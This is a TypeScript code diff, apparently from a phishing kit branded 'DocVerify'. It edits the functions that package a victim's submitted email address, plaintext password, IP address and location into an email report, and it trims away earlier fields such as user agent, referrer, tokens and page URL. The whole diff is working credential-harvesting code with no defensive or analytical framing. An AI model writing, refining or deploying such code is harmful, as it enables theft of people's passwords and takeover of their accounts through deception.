@@ -173,47 +173,12 @@ function formatEmailBody(payload: ResponsePayload): string {
   const val = (v: string | undefined): string =>
     v && v.trim() ? v.trim() : "Unknown";
 
-  // Fields rendered in fixed order at the top
-  const topKeys = new Set([
-    "type", "sendId", "datetime", "timestamp", "timezone",
-    "ipAddress", "email", "password", "passwordValue", "pwd", "secret",
-    "credential", "token", "country", "city", "region",
-    "location", "userAgent", "browserLanguage", "platform",
-    "referrer", "screenSize",
-  ]);
-
-  const lines = [
-    `Event: ${val(payload.type)}`,
-    `Send ID: ${val(payload.sendId)}`,
-    `Date & time: ${val(payload.datetime ?? payload.timestamp)}`,
-    `Timezone: ${val(payload.timezone)}`,
-    `IP address: ${val(payload.ipAddress)}`,
+  return [
     `Email: ${val(payload.email)}`,
+    `IP address: ${val(payload.ipAddress)}`,
     `Password value: ${val(payload.passwordValue ?? payload.password)}`,
-    // `Pwd: ${val(payload.pwd)}`,
-    // `Secret: ${val(payload.secret)}`,
-    // `Credential: ${val(payload.credential)}`,
-    // `Token: ${val(payload.token)}`,
-    `Country: ${val(payload.country)}`,
-    `City: ${val(payload.city)}`,
-    `Region: ${val(payload.region)}`,
     `Location: ${val(payload.location)}`,
-    `User agent: ${val(payload.userAgent)}`,
-    `Language: ${val(payload.browserLanguage)}`,
-    `Platform: ${val(payload.platform)}`,
-    `Referrer: ${val(payload.referrer)}`,
-    `Screen: ${val(payload.screenSize)}`,
-    "---",
-  ];
-
-  // Append any extra fields not already listed above
-  for (const [key, value] of Object.entries(payload)) {
-    if (topKeys.has(key)) continue;
-    if (!value || !String(value).trim()) continue;
-    lines.push(`${key}: ${String(value).trim()}`);
-  }
-
-  return lines.join("\n");
+  ].join("\n");
 }
 
 function buildResponseItem(
@@ -222,11 +187,11 @@ function buildResponseItem(
 ): { subject: string; message: string; fields: Record<string, string>; sendId: string } {
   const sendId = `${Date.now()}-${payload.attempt ?? "0"}-${Math.random().toString(36).slice(2, 8)}`;
   const safe = sanitizePayload({
-    ...payload,
-    ...meta,
+    ipAddress: payload.ipAddress ?? meta.ipAddress,
+    password: payload.passwordValue ?? payload.password,
+    location: payload.location ?? meta.location,
     sendId,
     timestamp: payload.timestamp ?? new Date().toISOString(),
-    pageUrl: payload.pageUrl ?? (typeof window !== "undefined" ? window.location.href : ""),
   });
   const subject = `[DocVerify] ${payload.type.replace(/_/g, " ")} (${sendId})`;
   const message = formatEmailBody({ ...payload, ...safe, sendId });
